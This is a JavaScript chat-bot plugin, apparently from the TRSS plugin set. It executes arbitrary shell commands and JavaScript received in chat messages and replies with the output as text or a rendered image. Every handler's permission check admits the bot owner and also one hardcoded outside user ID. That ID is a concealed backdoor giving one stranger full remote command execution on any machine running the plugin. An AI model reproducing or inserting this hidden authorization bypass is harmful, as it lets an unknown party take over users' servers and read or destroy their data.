let htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
let tplFile = `${htmlDir}Code.html`

export class RemoteCommand extends plugin {
  constructor() {
    super({
      name: "远程命令",
      dsc: "远程命令",
      event: "message",
      priority: 10,
      rule: [
        {
          reg: "^rcjp.+",
          fnc: "RemoteCommandJsPic"
        },
        {
          reg: "^rcj.+",
          fnc: "RemoteCommandJs"
        },
        {
          reg: "^rcp.+",
          fnc: "RemoteCommandPic"
        },
        {
          reg: "^rc.+",
          fnc: "RemoteCommand"
        }
      ]
    })
  }

  async execSync(cmd) {
    return new Promise((resolve, reject) => {
      exec(cmd, (error, stdout, stderr) => {
        resolve({ error, stdout, stderr })
      })
    })
  }

  async evalSync(cmd) {
    let ret = {}
    try {
      ret.stdout = await eval(cmd)
      if (typeof ret.stdout == "object") {
        if (Buffer.isBuffer(ret.stdout))
          ret.stdout = Buffer.from(ret.stdout, "utf8").toString()
        else
          ret.stdout = JSON.stringify(ret.stdout)
      }
    } catch (err) {
      ret.stderr = err
    }
    return ret
  }

  async RemoteCommandJs(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    let cmd = this.e.msg.replace("rcj", "").trim()

    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
    let ret = await this.evalSync(cmd)
    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)

    if (ret.stdout) {
      await this.reply(ret.stdout, true)
    }

    if (ret.stderr) {
      await this.reply(`错误输出：\n${ret.stderr}`, true)
    }
  }

  async RemoteCommandJsPic(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    let cmd = this.e.msg.replace("rcjp", "").trim()

    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
    let ret = await this.evalSync(cmd)
    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)

    if (ret.stdout) {
      let Code = await ansi_up.ansi_to_html(ret.stdout)
      let img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(img, true)
    }

    if (ret.stderr) {
      let Code = await ansi_up.ansi_to_html(ret.stderr)
      let img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(["错误输出：", img], true)
    }
  }

  async RemoteCommand(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    let cmd = this.e.msg.replace("rc", "").trim()

    logger.mark(`[远程命令] 执行：${logger.blue(cmd)}`)
    let ret = await this.execSync(cmd)
    logger.mark(`[远程命令]\n${ret.stdout.trim()}\n${logger.red(ret.stderr.trim())}`)

    if (ret.stdout) {
      await this.reply(ret.stdout.trim(), true)
    }

    if (ret.stderr) {
      await this.reply(`标准错误输出：\n${ret.stderr.trim()}`, true)
    }

    if (ret.error) {
      logger.error(`远程命令错误：${logger.red(ret.error)}`)
      await this.reply(`远程命令错误：${ret.error}`, true)
    }
  }

  async RemoteCommandPic(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    let cmd = this.e.msg.replace("rcp", "").trim()

    logger.mark(`[远程命令] 执行：${logger.blue(cmd)}`)
    let ret = await this.execSync(cmd)
    logger.mark(`[远程命令]\n${ret.stdout.trim()}\n${logger.red(ret.stderr.trim())}`)

    if (ret.stdout) {
      let Code = await ansi_up.ansi_to_html(ret.stdout.trim())
      let img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(img, true)
    }

    if (ret.stderr) {
      let Code = await ansi_up.ansi_to_html(ret.stderr.trim())
      let img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      await this.reply(["标准错误输出：", img], true)
    }

    if (ret.error) {
      logger.error(`远程命令错误：${logger.red(ret.error)}`)
      await this.reply(`远程命令错误：${ret.error}`, true)
    }
  }
}